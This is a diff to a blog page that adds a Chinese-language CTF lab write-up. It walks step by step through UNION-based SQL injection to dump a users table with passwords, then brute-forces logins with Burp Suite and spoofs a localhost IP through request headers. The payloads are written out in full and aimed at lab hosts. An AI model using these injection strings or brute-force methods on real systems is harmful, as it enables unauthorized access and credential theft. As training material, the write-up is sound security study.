@@ -173,7 +173,113 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                
+                <h1>一.GET型——注入</h1>
+<hr>
+<p>打开<a href="http://10.21.13.153:40000/sql.php?id=1" target="_blank" rel="noopener">http://10.21.13.153:40000/sql.php?id=1</a></p>
+<p><img src="https://i.imgur.com/coQoo3c.png" alt=""></p>
+<h2>第一步.判断注入点</h2>
+<p><img src="https://i.imgur.com/gR4aibT.png" alt=""></p>
+<p>输入=1，查询成功,
+&lt;br&gt;输入1'and'1'='2,查询失败
+&lt;br&gt;输入1’or'1'='1,查询成功，说明存在字符型注入</p>
+<p><img src="https://i.imgur.com/85qAv2G.png" alt=""></p>
+<h2>第二步.判断字段数</h2>
+<p>输入1' or 1=1 order by 1 #，查询成功</p>
+<p><img src="https://i.imgur.com/tufzrw3.png" alt=""></p>
+<p>&lt;br&gt;输入1' or 1=1 order by 2 #，查询成功</p>
+<p><img src="https://i.imgur.com/zDYspRc.png" alt=""></p>
+<p>&lt;br&gt;输入1' or 1=1 order by 3 #，查询失败，</p>
+<p><img src="https://i.imgur.com/5cPJOwM.png" alt=""></p>
+<p><strong>说明只有两个字段</strong></p>
+<h2>第三步.确定字段顺序</h2>
+<p>输入1'union select 1,2 #，查询成功</p>
+<p><img src="https://i.imgur.com/QMwWjwv.png" alt=""></p>
+<h2>第四步.获取当前数据库</h2>
+<p>输入1'union select 1,database() #，查询成功</p>
+<p><img src="https://i.imgur.com/twnta6g.png" alt=""></p>
+<p><strong>说明数据库名为zz</strong></p>
+<h2>第五步.获取数据库中的表</h2>
+<p>输入1'union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功</p>
+<p><img src="https://i.imgur.com/PX6jzTx.png" alt=""></p>
+<h2>第六步.获取表中的字段名</h2>
+<p>输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功</p>
+<p><img src="https://i.imgur.com/NwNYIgr.png" alt=""></p>
+<h2>第七步.获取数据</h2>
+<p>输入1'or 1=1 union select group_concat(id,first_name,last_name),group_concat(password) from users #，查询成功</p>
+<p><img src="https://i.imgur.com/3Xe0f3C.png" alt=""></p>
+<p>获得flag。。。。。。。</p>
+<h1>二.POST型——注入</h1>
+<hr>
+<ol>
+<li>搭建以自己ID命名的MYSQL数据库</li>
+<li>搭建字符型注入页面，用POST传递参数，输入id,显示username,age,sex</li>
+<li>手动一步一步注入，直到拿到flag</li>
+</ol>
+<h1>三.应用burp suite尝试暴破</h1>
+<hr>
+<h2>题目一：<a href="http://ctf4.shiyanbar.com/web/root/index.php" target="_blank" rel="noopener">http://ctf4.shiyanbar.com/web/root/index.php</a></h2>
+<p><img src="https://i.imgur.com/7TZRy6K.png" alt=""></p>
+<ol>
+<li>查看源代码，发现代码中存在隐藏文件“password.txt&quot;</li>
+</ol>
+<pre><code>![](https://i.imgur.com/DysIl6Z.png)
+</code></pre>
+<ol>
+<li>
+<p>修改URL，打开root目录下的password.txt文件</p>
+<p><img src="https://i.imgur.com/P2RyVWS.png" alt=""></p>
+</li>
+<li>
+<p>保存文件于本地，说明flag就在文件中</p>
+</li>
+<li>
+<p>返回原网页，打开代理，在form中任意输入字符，便于在burpsuite中找到破解点</p>
+<p>输入：1234，找到破解点</p>
+<p><img src="https://i.imgur.com/KTIfVU9.png" alt=""></p>
+</li>
+<li>
+<p>send to intruder,在positions选中破解位置</p>
+<p><img src="https://i.imgur.com/Nef363w.png" alt=""></p>
+</li>
+<li>
+<p>进入payloads,以simple list形式load...刚才保存的文件</p>
+<p><img src="https://i.imgur.com/vMtu9Hy.png" alt=""></p>
+</li>
+<li>
+<p>start attack</p>
+<p><img src="https://i.imgur.com/nxyGLYD.png" alt=""></p>
+</li>
+<li>
+<p>获得加载结果，根据不同加载量得到password:Nsf0cuS</p>
+<p><img src="https://i.imgur.com/7IM7N5x.png" alt=""></p>
+</li>
+<li>
+<p>发现网页中最多只能输入五个字符，重新拦截，直接在代理界面修改password为Nsf0cuS，forward,获得flag:这里没有flag哦 ！</p>
+<p><img src="https://i.imgur.com/vDwfRZv.png" alt=""></p>
+<p><img src="https://i.imgur.com/LhqDdJQ.png" alt=""></p>
+</li>
+</ol>
+<h2>题目二：only localhost can get flag<a href="http://10.21.13.153:20075/" target="_blank" rel="noopener">http://10.21.13.153:20075/</a></h2>
+<ol>
+<li>打开网页显示：only localhost can get flag
+<img src="https://i.imgur.com/thyue6l.png" alt=""></li>
+</ol>
+<ol>
+<li>抓包后伪造IP地址127.0.0.1，发现
+<img src="https://i.imgur.com/9TC3bee.png" alt="">
+参考链接：<a href="https://www.jianshu.com/p/98c08956183d" target="_blank" rel="noopener">https://www.jianshu.com/p/98c08956183d</a></li>
+<li>修改Accept-Language为chinese,得到flag:ZJGSCTF{y3s!I7_i3_s0_e4sy!
+<img src="https://i.imgur.com/OkGeXTB.png" alt=""></li>
+</ol>
+<h2>题目三：密码爆破<a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php</a></h2>
+<p>与题一相似，利用burpsuite抓包拦截，选中password破解部分，根据题意，password为四位纯数字数且第一位不为0，因此选择payload type为numbers,范围在1000-9999
+&lt;br&gt;
+<img src="https://i.imgur.com/DlDc2bI.png" alt=""></p>
+<p>得到password:1238</p>
+<p><img src="https://i.imgur.com/zkHyKtg.png" alt=""></p>
+<p>输入password&amp;&amp;vcode,得到flag:LJLJL789sdf#@sd</p>
+<p><img src="https://i.imgur.com/TnTlrPm.png" alt=""></p>
+
                 <hr>
                 
 
@@ -217,7 +323,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">一.GET型——注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">第一步.判断注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">第二步.判断字段数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">第三步.确定字段顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">第四步.获取当前数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">第五步.获取数据库中的表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">第六步.获取表中的字段名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">第七步.获取数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">二.POST型——注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">三.应用burp suite尝试暴破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">题目一：http://ctf4.shiyanbar.com/web/root/index.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">题目二：only localhost can get flaghttp://10.21.13.153:20075/</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">题目三：密码爆破http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php</span></a></li></ol></li></ol>
                 </div>
             </div>
         </div>
